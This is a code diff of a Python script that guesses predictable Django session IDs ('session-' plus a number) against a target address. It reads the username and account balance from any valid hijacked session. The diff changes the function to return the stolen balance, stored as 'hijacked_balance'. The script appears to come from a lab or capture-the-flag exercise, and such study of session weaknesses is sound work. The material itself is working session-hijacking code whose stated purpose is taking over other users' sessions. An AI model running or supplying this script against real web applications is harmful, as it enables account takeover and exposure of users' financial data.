@@ -5,7 +5,7 @@ import json
 def test_session(address):
     django_session = 'sessionid'
     session_guess_base = 'session-'
-
+    hijacked_balance = 0
     test_req = requests.get(f'{address}/')
     token = test_req.cookies.get('csrftoken')
 
@@ -21,18 +21,19 @@ def test_session(address):
             response_json = r.json()
             username = response_json.get('username', 'anonymous')
 
+            hijacked_balance = response_json['balance']
             print(f'Guess {guess}: session={guessed_session}')
             print(f"Username: {response_json['username']}\n{'-'*40}")
-            print(f"Balance: {response_json['balance']}\n{'-'*40}")
+            print(f"Balance: {hijacked_balance}\n{'-'*40}")
 
             if username != 'anonymous':
                 print("Valid session found!")
-                return guess
+                return hijacked_balance
         except Exception as e:
             print(f'Error: {e}')
 
     print("No valid session found.")
-    return guess
+    return hijacked_balance
 
 
 def main(argv):
